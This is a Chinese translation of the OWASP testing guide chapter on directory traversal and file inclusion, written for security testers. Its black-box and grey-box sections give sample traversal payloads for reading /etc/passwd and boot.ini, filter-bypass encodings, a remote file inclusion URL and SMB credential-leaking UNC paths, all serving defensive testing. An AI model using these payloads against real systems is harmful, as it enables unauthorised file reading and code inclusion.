# 测试目录遍历和文件包含

|ID          |
|------------|
|WSTG-ATHZ-01|

## 概述

许多 Web 应用程序在日常运营中使用和管理文件。由于输入验证方法设计或部署不当，攻击者可能利用系统漏洞访问或写入不应被访问的文件。在特定情况下，甚至可能执行任意代码或系统命令。

传统上，Web 服务器和 Web 应用程序实施身份验证机制来控制对文件和资源的访问。Web 服务器尝试将用户的文件限制在"根目录"或"Web 文档根目录"内，这代表文件系统上的一个物理目录。用户需要将此目录视为 Web 应用程序层次结构中的基础目录。

权限定义使用访问控制列表（ACL）来实现，该列表标识哪些用户或用户组能够访问、修改或执行服务器上的特定文件。这些机制旨在防止恶意用户访问敏感文件（例如，类 UNIX 平台上的常见 `/etc/passwd` 文件）或避免执行系统命令。

许多 Web 应用程序使用服务器端脚本包含不同类型的文件。使用这种方法来管理图像、模板、加载静态文本等情况很常见。不幸的是，如果输入参数（如表单参数、Cookie 值）没有得到正确验证，这些应用程序就会暴露安全漏洞。

在 Web 服务器和 Web 应用程序中，这类问题出现在路径遍历/文件包含攻击中。通过利用这类漏洞，攻击者能够读取正常情况下无法读取的目录或文件，访问 Web 文档根目录之外的数据，或包含来自外部站点的脚本和其他类型的文件。

出于 OWASP 测试指南的目的，仅考虑与 Web 应用程序相关的安全威胁，而非 Web 服务器的威胁（例如，微软 IIS Web 服务器中著名的 `%5c` 转义代码）。对于感兴趣的读者，参考资料部分将提供进一步的阅读建议。

这种攻击也被称为点-点-斜杠攻击（`../`）、目录遍历、目录攀爬或回溯。

在评估过程中，要发现路径遍历和文件包含缺陷，测试人员需要执行两个不同的阶段：

1. 输入向量枚举（对每个输入向量进行系统评估）
2. 测试技术（对攻击者利用漏洞所使用的每种攻击技术进行有条理的评估）

## 测试目标

- 识别与路径遍历相关的注入点。
- 评估绕过技术并确定路径遍历的影响范围。

## 如何测试

### 黑盒测试

#### 输入向量枚举

为了确定应用程序的哪一部分容易受到输入验证绕过的影响，测试人员需要枚举应用程序中所有接受用户内容的部分。这包括 HTTP GET 和 POST 查询，以及常见的选项如文件上传和 HTML 表单。

以下是此阶段需要执行的一些检查示例：

- 是否有可用于文件相关操作的请求参数？
- 是否有不寻常的文件扩展名？
- 是否有有趣的变量名？
    - `https://example.com/getUserProfile.jsp?item=ikki.html`
    - `https://example.com/index.php?file=content`
    - `https://example.com/main.cgi?home=index.htm`
- 是否可以识别 Web 应用程序用于动态生成页面或模板的 Cookie？
    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

#### 测试技术

测试的下一阶段是分析 Web 应用程序中存在的输入验证函数。使用前面的示例，名为 `getUserProfile.jsp` 的动态页面从文件加载静态信息并将内容展示给用户。攻击者可以插入恶意字符串 `../../../../etc/passwd` 来包含 Linux/UNIX 系统的密码哈希文件。显然，这种攻击只有在验证检查点失败时才可能；根据文件系统权限，Web 应用程序本身必须能够读取该文件。

**注意：** 要成功测试此缺陷，测试人员需要了解被测试的系统以及所请求文件的位置。从 IIS Web 服务器请求 `/etc/passwd` 是没有意义的。

```text
https://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```

另一个常见示例是包含来自外部源的内容：

```text
https://example.com/index.php?file=https://www.owasp.org/malicioustxt
```

同样的方法也适用于 Cookie 或任何其他用于动态页面生成的输入向量。

更多文件包含有效载荷可以在 [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) 找到。

需要注意的是，不同的操作系统使用不同的路径分隔符：

- 类 Unix 操作系统：
    - 根目录：`/`
    - 目录分隔符：`/`
- Windows 操作系统：
    - 根目录：`<驱动器字母>:`
    - 目录分隔符：`\` 或 `/`
- 经典 macOS：
    - 根目录：`<驱动器字母>:`
    - 目录分隔符：`：`

开发者常犯的一个错误是没有考虑到所有形式的编码，因此只对基本编码内容进行验证。如果第一次测试字符串不成功，请尝试其他编码方案。

您可以在 [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal) 找到编码技术和可直接使用的目录遍历有效载荷。

#### Windows 特定注意事项

- Windows Shell：在 shell 命令中使用的路径末尾添加以下任何内容都不会造成功能差异：
    - 路径末尾的尖括号 `<` 和 `>`
    - 路径末尾正确闭合的双引号
    - 额外的当前目录标记，如 `./` 或 `.\`
    - 额外的父目录标记与可能存在也可能不存在的任意项目：
        - `file.txt`
        - `file.txt...`
        - `file.txt<空格>`
        - `file.txt""""`
        - `file.txt<<<>>><`
        - `./././file.txt`
        - `nonexistant/../file.txt`
- Windows API：在任何 shell 命令或 API 调用中，当字符串作为文件名使用时，以下项目会被丢弃：
    - 句点
    - 空格
- Windows UNC 文件路径：用于引用 SMB 共享上的文件。有时，应用程序可能被引导引用远程 UNC 文件路径上的文件。如果是这样，Windows SMB 服务器可能会向攻击者发送存储的凭据，这些凭据可以被捕获和破解。这些也可能与自引用 IP 地址或域名一起使用以绕过过滤器，或用于访问 SMB 共享上攻击者无法访问但可从 Web 服务器访问的文件。
    - `\\server_or_ip\path\to\file.abc`
    - `\\?\server_or_ip\path\to\file.abc`
- Windows NT 设备命名空间：用于引用 Windows 设备命名空间。某些引用将允许使用不同路径访问文件系统。
    - 可能等同于驱动器字母，如 `c:\`，甚至是未分配字母的驱动器卷：`\\.\GLOBALROOT\Device\HarddiskVolume1\`
    - 引用机器上的第一个磁盘驱动器：`\\.\CdRom0\`

### 灰盒测试

当使用灰盒测试方法进行分析时，测试人员需要遵循与黑盒测试相同的方法论。但是，由于他们可以审查源代码，因此可以更轻松、更准确地搜索输入向量。在源代码审查期间，他们可以使用简单工具（如 *grep* 命令）在应用程序代码中搜索一个或多个常见模式：包含函数/方法、文件系统操作等。

- `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
- `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
- `ASP: include file, include virtual, ...`

使用在线代码搜索引擎（如 [Searchcode](https://searchcode.com/)），也有可能找到互联网上发布的开源软件中的路径遍历缺陷。

对于 PHP，测试人员可以使用以下正则表达式：

```text
(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

使用灰盒测试方法，可以发现通常难以发现的漏洞，甚至在标准黑盒评估中无法发现的漏洞。

一些 Web 应用程序使用存储在数据库中的值和参数生成动态页面。当应用程序向数据库添加数据时，可能可以插入精心构造的路径遍历字符串。这种安全问题很难发现，因为包含函数内部的参数看起来是内部的且是**安全的**，但实际上并非如此。

此外，通过审查源代码，可以分析本应处理无效输入的函数：一些开发人员尝试将无效输入更改为有效输入，以避免警告和错误。这些函数通常容易出现安全缺陷。

考虑具有以下指令的 Web 应用程序：

```php
filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");
```

测试此缺陷的方法：

```text
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```

## 工具

- [DotDotPwn - 目录遍历模糊测试工具](https://github.com/wireghoul/dotdotpwn)
- [路径遍历模糊字符串（来自 WFuzz 工具）](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)
- [ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net)
- 编码/解码工具
- [字符串搜索器 "grep"](https://www.gnu.org/software/grep/)
- [DirBuster](https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project)

## 参考资料

- [PayloadsAllTheThings - 目录遍历](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [PayloadsAllTheThings - 文件包含](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### 白皮书

- [phpBB 附件模块目录遍历 HTTP POST 注入](https://seclists.org/vulnwatch/2004/q4/33)
- [Windows 文件假名：入侵与诗](https://www.slideshare.net/BaronZor/windows-file-pseudonyms)
